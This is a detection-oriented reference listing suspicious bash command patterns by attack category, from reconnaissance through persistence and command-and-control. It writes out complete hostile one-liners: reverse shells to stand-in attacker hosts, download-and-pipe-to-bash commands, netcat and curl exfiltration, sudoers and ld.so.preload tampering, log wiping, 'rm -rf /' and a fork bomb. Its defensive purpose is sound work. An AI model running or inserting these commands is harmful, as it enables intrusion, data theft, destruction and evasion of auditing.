## Comprehensive List of Suspicious Command Patterns in Bash Scripts

Detecting malicious bash scripts requires understanding the diverse tactics attackers employ. Below is an extensive catalog of suspicious command patterns organized by attack category.

### **Reconnaissance and Information Gathering**

**System Information Extraction:**
- `whoami` – identifying current user
- `uname -a` – obtaining system information and kernel version
- `hostname` – getting system hostname
- `id` – determining user IDs and groups
- `groups` – listing user group membership

**User and Privilege Enumeration:**
- `cat /etc/passwd` – reading all user accounts
- `cat /etc/shadow` – accessing password hashes (requires elevated privileges)
- `cron -l` or `crontab -l` – listing scheduled tasks
- `sudo -l` – checking available sudo privileges
- `cat /etc/sudoers` – viewing sudo configuration

**Network and Infrastructure Reconnaissance:**
- `nmap` – port scanning and network mapping
- `nmap -sV target_ip` – service version detection
- `netstat -anp` – listing all network connections and associated processes
- `ss -anp` – socket statistics (modern alternative to netstat)
- `ifconfig` or `ip addr` – viewing network interface configuration
- `arp -a` – listing Address Resolution Protocol table

**Cloud-Specific Reconnaissance:**
- `curl 169.254.169.254` or `wget 169.254.169.254` – accessing AWS metadata service
- `get-caller-identity` – AWS CLI credential verification
- `describe-instances` – querying AWS instances

**File and Credential Searching:**
- `find . -name "*password*"` – searching for password-related files
- `grep -r "secret" /path/to/dir` – searching for sensitive keywords
- `find / -type f -name "*.key"` – searching for cryptographic keys
- `grep -i "credential" /etc/config/*` – looking for credentials in configuration files

### **Privilege Escalation**

**Permission Modification:**
- `chmod` – changing file permissions
- `chmod -R 777 /` – **EXTREMELY DANGEROUS** - making all files world-readable/writable/executable
- `chmod -R 777 /etc` – making system configuration files universally accessible
- `setfacl` – setting Access Control Lists for privilege escalation

**Sudo Manipulation:**
- `sudo` – executing commands with elevated privileges
- `sudo -l` – identifying available sudo commands (reconnaissance)
- `echo "user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers` – adding unrestricted sudo access

**Critical File Modification:**
- `echo "" > /etc/sudoers` – overwriting sudoers file
- `cat /etc/shadow > /tmp/shadow` – extracting password hashes
- `chattr -i /etc/ld.so.preload` – removing immutable flag from library preload file
- `echo "/tmp/a.so" >> /etc/ld.so.preload` – hijacking execution flow via library injection

### **Malicious Code Execution and Injection**

**Command Substitution with Arbitrary Code:**
- `` `command` `` – backtick command substitution
- `$(command)` – modern command substitution syntax
- `eval "malicious_command=$(wget http://malicious-site.com/backdoor.sh -O -)"` – downloading and executing remote code
- `eval "$USER_INPUT"` – directly evaluating untrusted input

**Reverse Shell Patterns:**
- `bash -i >& /dev/tcp/192.168.2.6/8080 0>&1` – interactive bash reverse shell
- `exec 100<>/dev/tcp/192.168.2.6/8080; cat <&100 | while read line; do $line 2>&100 >&100; done` – file descriptor-based reverse shell
- `/bin/bash -i >& /dev/tcp/10.10.17.1/1337 0>&1` – reverse shell variant
- `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` – bash reverse shell with specific IP/port

**Network File Descriptor Manipulation:**
- `/dev/tcp/HOST/PORT` – accessing TCP sockets directly
- `/dev/udp/HOST/PORT` – accessing UDP sockets directly
- `exec 196<>/dev/tcp/X.X.X.X/NNN` – creating high-numbered file descriptor for network communication
- `sh <&196 >&196 2>&196` – redirecting shell I/O through network file descriptor

**Obfuscated Command Execution:**
- `eval` combined with encoded strings – executing decoded commands
- `base64` encoded commands piped to eval – `echo "encoded_command" | base64 -d | bash`
- `hexadecimal` encoded payloads with `printf` – hiding command intent
- `octal` encoded payloads – alternative obfuscation method

**Variable Expression Assembly:**
- `a="al";b="ert";c="(1";d=")";eval(a+b+c+d);` – dynamically constructing command strings
- Commands built by concatenating multiple variables to evade pattern matching

### **Data Theft and Exfiltration**

**File Compression and Archiving:**
- `tar -czvf data.tar.gz /path/to/sensitive/data` – compressing sensitive data
- `zip -r sensitive_data.zip /path/to/sensitive` – creating encrypted archives
- `find / -type f -name "*.pdf" -o -name "*.docx"` – identifying files for exfiltration

**Data Transfer:**
- `scp data.tar.gz user@attacker_host:/tmp/` – copying compressed data via SSH
- `wget http://attacker.com/upload.php?file=data` – uploading via HTTP
- `curl -F "file=@data.tar.gz" http://attacker.com/upload` – uploading with curl
- `nc -w 3 attacker.com 4444 < data.tar.gz` – sending data through netcat

**Credential Harvesting:**
- `cat /etc/shadow > file` – extracting password hashes
- `cat ~/.ssh/id_rsa` – stealing private SSH keys
- `cat ~/.bash_history` – accessing command history for credentials
- `env | grep -i pass` – searching environment variables for passwords

### **Trail Covering and Log Manipulation**

**Bash History Erasure:**
- `HISTFILESIZE=0` – disabling history file size (stops recording)
- `HISTSIZE=0` – clearing in-memory history
- `history -c` – clearing current session history
- `echo "" > ~/.bash_history` – truncating bash history file
- `echo "" > ~/.zsh_history` – clearing zsh history
- `rm ~/.bash_history` – deleting history file entirely
- `ln -sf /dev/null ~/.bash_history` – linking history to /dev/null

**System Logging Interruption:**
- `service auditd stop` – stopping audit daemon
- `systemctl stop auditd` – disabling audit service using systemctl
- `service rsyslog stop` – stopping syslog service
- `/etc/init.d/syslog stop` – stopping system logging via init script
- `echo "" > /var/log/auth.log` – truncating authentication logs
- `echo "" > /var/log/syslog` – clearing system log

**File Attribute Manipulation:**
- `chattr -i /var/log/auth.log` – removing immutable flag from logs to allow deletion
- `chattr +a /etc/ld.so.preload` – making file append-only

### **Dangerous System Operations**

**Destructive Commands:**
- `rm -rf /` – **CATASTROPHIC** - recursively deleting entire filesystem
- `command >/dev/sda` – overwriting hard drive with command output
- `dd if=/dev/zero of=/dev/sda` – zeroing out hard drive
- `mv directory /dev/null` – moving files to the bit bucket
- `chmod -R 777 /` – **DANGEROUS** - making all files world-accessible

**Resource Exhaustion:**
- `:(){ :|:& };:` – **FORK BOMB** - recursively spawning processes until system freeze
- `ulimit -u unlimited` – removing process limits before fork bomb
- `ulimit -n 999999` – setting extremely high file descriptor limits
- `yes > /dev/null &` – spawning infinite yes processes

### **Persistence Mechanisms**

**Cron Job Insertion:**
- `crontab -e` – editing user cron table
- `echo "*/1 * * * * /path/to/backdoor.sh" | crontab` – adding persistent reverse shell via cron
- `echo "command" >> /etc/crontab` – adding to system-wide cron
- Cron files modified in `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`

**Shell Configuration File Modification:**
- `echo "/tmp/qwer" >> ~/.bashrc` – injecting code into user's bash configuration
- `echo "command" >> ~/.bash_profile` – adding backdoor to user login script
- `echo "reverse_shell" >> /etc/profile` – system-wide persistence via profile
- `echo "backdoor" >> ~/.zshrc` – persistent injection into zsh

**Library Preloading:**
- `echo "/tmp/a.so" >> /etc/ld.so.preload` – injecting malicious library
- `LD_PRELOAD=/tmp/malicious.so /usr/bin/command` – hijacking library loading

**SSH Key Insertion:**
- `echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys` – adding backdoor SSH public key
- `echo "key" >> /root/.ssh/authorized_keys` – root-level SSH backdoor

### **Network Communication and Command & Control**

**Payload Download:**
- `wget http://malicious.com/exploit.sh` – downloading script with wget
- `curl http://malicious.com/malware` – downloading with curl
- `wget http://malicious_source_url -O-|sh` – downloading and executing in one command
- `curl -s http://attacker.com/shell.sh | bash` – piping download directly to bash
- `tftp attacker.com get payload.sh` – downloading via TFTP

**Proxy Configuration for C&C:**
- `http_proxy=192.168.1.1:8080` – setting HTTP proxy for communications
- `https_proxy=` – setting HTTPS proxy
- `ALL_PROXY=` – setting universal proxy

**Process Hiding and C&C Communication:**
- `netstat -anp | grep '666'` – searching for specific ports (backdoor indicators)
- `netstat -anp | grep '107.172'` – searching for specific IPs
- `kill -9` combined with grep – terminating processes communicating with C&C
- `netstat -anp | grep '666' | awk '{print $7}'` – identifying malicious processes

### **Anti-Analysis and Evasion Techniques**

**Script Obfuscation Indicators:**
- `shc` – compiling bash scripts to binaries
- `Bashfuscator` – framework for bash obfuscation
- Scripts using `eval` with encoded content
- Multi-layered encoding (base64 → base32 → hexadecimal)
- Minified scripts (single-line code)

**Environment Variable Manipulation:**
- Shellshock exploitation patterns in environment variables
- `() { :; }; /bin/bash -c ...` – function definition followed by code execution
- Commands appended to exported environment variables

**Binary Masquerading:**
- Executable files disguised as image files (.jpg, .png)
- Scripts embedded inside data files with `dd` skip operations

### **File Descriptor and Socket Operations**

**Unusual Socket Operations:**
- Custom file descriptor assignments: `exec 3<>/dev/tcp/host/port`
- Socket redirection for command execution
- Direct I/O through socket file descriptors

### **Context-Dependent Indicators**

**Dangerous Command Combinations:**
- `eval` + `read` + user input – code injection vulnerability
- `grep` + `awk` + `xargs` + destructive command – pipeline attack
- Download command + pipe to interpreter – remote code execution
- History commands combined with data theft – covering evidence of exfiltration

**Suspicious Scripting Patterns:**
- Functions defined but never called directly
- Unused variable assignments (potential obfuscation)
- Excessive use of `tr`, `sed`, `awk` for string manipulation
- Character-by-character string construction

***

When reviewing bash scripts, the presence of **multiple patterns combined** is more suspicious than isolated commands. For example, seeing `wget` followed by file execution followed by history clearing is a strong indicator of malicious intent. Always use **ShellCheck/Shellharden/BSA (Bash Static Analyser)** for automated pattern detection, **deobfuscation tools** like `unshell` for encoded scripts, and **manual review** for context, as legitimate system administration scripts may occasionally contain innocent versions of these commands.
